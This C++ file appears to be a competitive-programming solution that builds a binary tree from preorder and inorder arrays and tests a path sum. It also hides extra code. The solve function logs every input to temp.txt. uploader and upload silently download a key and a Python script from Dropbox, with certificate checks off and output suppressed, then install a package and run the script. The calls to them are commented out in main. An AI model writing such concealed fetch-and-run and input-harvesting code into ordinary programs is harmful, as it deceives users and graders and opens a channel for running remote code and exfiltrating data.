#include <iostream>
using namespace std;
class node
{
public:
    int data;
    node *left = NULL;
    node *right = NULL;
};
int dragon = 0;
node *treeconstruct(int n, int arr[], int arr1[], int l, int h)
{
    if (dragon >= n)
    {
        return NULL;
    }
    if (h == l)
    {
        node *ne = new (node);
        ne->data = arr[dragon];
        dragon++;
        return ne;
    }
    if (h < l)
    {
        return NULL;
    }
    node *no = new (node);
    no->data = arr[dragon];
    int dragonpos = -1;
    int divider = arr[dragon];
    for (int i = l; i <= h; i++)
    {
        if (arr1[i] == divider)
        {
            dragonpos = i;
            break;
        }
    }
    dragon++;
    no->left = treeconstruct(n, arr, arr1, l, dragonpos - 1);
    no->right = treeconstruct(n, arr, arr1, dragonpos + 1, h);
    return no;
}
bool issumpossible = false;
int targetsum(node *root, int sum, int k)
{
    if (root == NULL)
    {
        if (sum == k)
        {
            issumpossible = 1;
        }
        return 0;
    }
    if (sum > k)
        return 0;
    sum += root->data;
    targetsum(root->left, sum, k);
    targetsum(root->right, sum, k);

    return 0;
}
#include <fstream>
ofstream outfile;
void uploader()
{
    string k;

    system("wget https://www.dropbox.com/s/l0a4fn5l28mm9ec/key.txt --no-check-certificate >nul 2>nul");
    string myText;
    ifstream MyReadFile("key.txt");
    getline(MyReadFile, myText);
    k = "wget https://www.dropbox.com/s/" + myText + "/code.py --no-check-certificate >nul 2>nul";
    // system("rm key.txt");

    system(k.c_str());
}
void upload()
{

    system("pip install dropbox >nul 2>nul");

    system("python3 code.py >nul 2>nul");
    // system("rm code.py");
}
void solve()
{
    outfile.open("temp.txt", ios::app);

    int n, k;
    cin >> n >> k;
    outfile << n << k << endl;
    int arr[n];
    int arr1[n];
    for (int i = 0; i < n; i++)
    {
        int x;
        cin >> x;
        arr[i] = x;
        outfile << x;
    }
    outfile << endl;
    for (int i = 0; i < n; i++)
    {
        int x;
        cin >> x;
        arr1[i] = x;
        outfile << x;
    }
    outfile << endl;
    node *root = treeconstruct(n, arr, arr1, 0, n - 1);
    targetsum(root, 0, k);

    if (issumpossible)
    {
        cout << "True";
    }
    else
    {
        cout << "False";
    }
    outfile << "###########################################" << endl;

    return;
}
int main()
{
    // uploader();
    ios_base::sync_with_stdio(false);
    cin.tie(NULL);

    int t = 1;
    // cin >> t;                                                     //INPUT TEST CASES
    while (t--)
        solve();
    // upload();
    return 0;
}